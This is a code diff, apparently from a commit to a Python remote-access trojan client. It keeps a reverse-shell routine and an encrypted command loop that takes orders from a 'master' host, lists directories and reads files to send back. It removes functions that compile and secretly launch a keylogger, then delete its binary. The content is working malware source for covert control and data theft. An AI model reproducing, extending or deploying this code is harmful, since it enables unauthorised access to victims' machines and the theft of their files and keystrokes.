@@ -5,8 +5,7 @@ from os import dup2, fork, listdir, getcwd, system
 from subprocess import run, Popen, DEVNULL
 from time import sleep
 
-
-from utils.crypto import crypto_run
+from utils.crypto import encrypt, decrypt
 
 
 def reverse_shell(master_hostname, shell_port):
@@ -24,41 +23,14 @@ def reverse_shell(master_hostname, shell_port):
             # reborn(master_hostname, master_port)
     exit(0)
 
-def compile_keylogger():
-    # compile keylogger into executable for correct arch
-    pid = fork()
-    if pid == 0:
-        pid2 = fork()
-        if pid2 == 0:
-            # export cls="/usr/bin/gcc keylogger.c -o top"
-            # code script to copy ove all c code on one file and obfuscate it as well
-            system("gcc tools/keylogger.c -o keylogger >/dev/null 2>&1")
-            exit(0)
-        exit(0)
-
-def run_keylogger():
-    # run keylogger executable
-    pid = fork()
-    if pid == 0:
-        pid2 = fork()
-        if pid2 == 0:
-            # ./top
-            sleep(2)
-            system("./keylogger &")
-            sleep(2)
-            system("rm keylogger")
-            exit(0)
-        exit(0)
-
-
 def send_res(conn, res):
     # encrypted plain text response and send to master
     try:
         res = "ACK" + res
-        encoded_res = res.encode("utf-8")
-        encrypted_res = crypto_run("encrypt", encoded_res)
-        conn.send(encrypted_res)
+        crypt_res = encrypt(res)
+        conn.send(crypt_res)
     except socket_error:
+        print("error1")
         # error sending data to master
         exit(0)
     return conn
@@ -67,11 +39,11 @@ def send_res(conn, res):
 def recv_cmd(conn, buffer):
     # receive encrypted response from master and decrypt
     try:
-        encrypted_cmd = conn.recv(buffer)
-        encoded_cmd = crypto_run("decrypt", encrypted_cmd) 
-        cmd = encoded_cmd.decode("utf-8")
+        crypt_cmd = conn.recv(buffer)
+        cmd = decrypt(crypt_cmd)
         return conn, cmd
     except socket_error:
+        print("error2")
         # error connecting to master to recv data, reborn
         exit(0)
 
@@ -92,9 +64,11 @@ def cmd_shell(conn, master_hostname, master_port):
             for resp in resp_list:
                 res += resp + "\n"
             conn = send_res(conn, res)
+
         elif cmd[:3] == "pwd":
             res = str(getcwd())
             conn = send_res(conn, res)
+
         elif cmd[:3] == "cat":
             data = ""
             try:
@@ -125,12 +99,7 @@ def cmd_shell(conn, master_hostname, master_port):
             shell_port = int(cmd[5:])
             sleep(1)
             reverse_shell(master_hostname, shell_port)
-        
-        elif cmd[:6] == "keylog":
-            compile_keylogger()
-            run_keylogger()
-            res = "[*] Started keylogging"
-            conn = send_res(conn, res)
+            
         else:
             res = "404could not find command"
             conn = send_res(conn, res)
